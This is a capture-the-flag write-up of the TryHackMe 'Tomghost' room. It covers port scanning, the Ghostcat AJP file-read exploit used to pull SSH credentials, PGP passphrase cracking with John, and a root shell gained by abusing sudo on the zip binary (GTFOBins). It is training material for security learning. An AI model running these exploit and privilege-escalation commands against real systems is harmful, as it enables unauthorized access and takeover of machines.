---
description: https://tryhackme.com/room/tomghost
---

# Tomghost

## Nmap

```
sudo nmap 10.10.16.201 -p- -sS -sV

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
(Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 8080 is running Tomcat as shown below:

![](<../../../.gitbook/assets/image (935).png>)

Port 8009 is running ajp13. Researching this service shows this is a port that runs alongside Apache Tomcat. A brief description of this service is shown below:

_Ajp13 protocol is packet-oriented TCP protocol, by default this service runs on port 8009. AJP13 protocol is a binary format, which is intended for better performance over the HTTP protocol running over TCP port 8080_.

Researching exploits for this service we can see a vulnerability known as Ghostcat. This exploit (**CVE-2020-10487**) allows us to read local files in the Tomcat web directory and even configuration files. Below is a PoC for this on Github.

{% embed url="https://github.com/00theway/Ghostcat-CNVD-2020-10487" %}

First download the python file and run with the following syntax:

```
python3 exploit.py <TargetIP> <PORT> <FileToRead> read 
```

![](<../../../.gitbook/assets/image (938) (1).png>)

We now have the credentials: `skyfuck:8730281lkjlkjdqlksalks` Using the gathered cerednetials we are then able to connect by SSH.

![](<../../../.gitbook/assets/image (939).png>)

The home directory for skyfuck contains a file called tryhackme.asc. The file can be used to decrypt the contents of credential.pgp.

![](<../../../.gitbook/assets/image (940).png>)

First we need to copy the contents of tryhackme.asc to our attacking machine then use `gpg2john` to create a hash of the file. After completing this John can be run to crack the passphrase.

![](<../../../.gitbook/assets/image (941).png>)

Then on the SSH session import the key then attempt to decrypt the credential.pgp file with `gpg -d`.

```
gpg --import tryhackme.asc
gpg -d credential.pgp
```

![](<../../../.gitbook/assets/image (942).png>)

Which we can then SSH in as the user 'merlin'.

![](<../../../.gitbook/assets/image (943).png>)

Running `sudo -l` on the user shows we can run the zip binary as root without supplying a password. Refering to GTFOBins at [https://gtfobins.github.io/gtfobins/zip/](https://gtfobins.github.io/gtfobins/zip/). Shows for the zip binary we can gain a root shell running:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

![](<../../../.gitbook/assets/image (944).png>)
